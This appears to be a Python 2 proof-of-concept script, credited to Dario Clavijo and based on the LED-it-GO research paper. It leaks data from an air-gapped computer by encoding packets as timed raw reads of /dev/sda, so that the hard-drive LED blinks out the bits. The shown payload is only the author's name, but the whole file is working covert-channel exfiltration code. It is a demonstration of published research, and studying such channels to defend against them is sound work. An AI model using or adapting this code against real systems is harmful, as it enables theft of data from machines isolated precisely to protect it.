#!/usr/bin/env python
# Proof of concept for data exfiltration through HDD Activity Led
# Leaking (a lot of) Data from Air-Gapped Computers via the (small) Hard Drive LED 
# Based on paper http://cyber.bgu.ac.il/advanced-cyber/system/files/LED-it-GO_0.pdf
# Dario Clavijo 2017

import os,time,zlib,binascii

BLOCK_SIZE=512

if hasattr(os, 'sync'):
    sync = os.sync
else:
    import ctypes
    libc = ctypes.CDLL("libc.so.6")
    def sync():
        libc.sync()

def transmit_bits(tmpfile,bits, T0, readsize):
	sync() #drop cache
	fp = open(tmpfile)	
	offset = 0
	offsetincrement = BLOCK_SIZE;
	fp.seek(offset)
	for b in list(bits):
                #sync()
		if (b=='0'):
			print "0 sleep " + str(T0)
			time.sleep(T0);
		if (b=='1'):
                        sync()
			fp.seek(offset)
			print "1 read %d bytes" % len(fp.read(readsize)) 
			offset += offsetincrement
	return;

def manchester(bits):
	r = ""
	for b in list(bits):
		if b == '0':
			r += '01'
		if b == '1':
			r += '10'
	return r		

def itob(i):
    return bin(i).replace('0b','')

def atob(a):
    return itob(int(binascii.hexlify(a), 16))

def itob32(i):
    return itob(i).zfill(32)

def itob16(i):
    return itob(i).zfill(16)

def transmit_packet(payload):
        preamble = "1010101010101010"
        payload_size = len(payload)
	print "preamble, size, payload, crc32"
        print preamble, itob16(payload_size), atob(payload), itob32(zlib.crc32(payload))
        dataONOFF = manchester(preamble+itob16(payload_size)+atob(payload)+itob32(zlib.crc32(payload)))
        #print data
        time.sleep(1)
        transmit_bits('/dev/sda',dataONOFF,0.01,4096)

def main():
    while True:
        transmit_packet("Dario  Clavijo")

main()
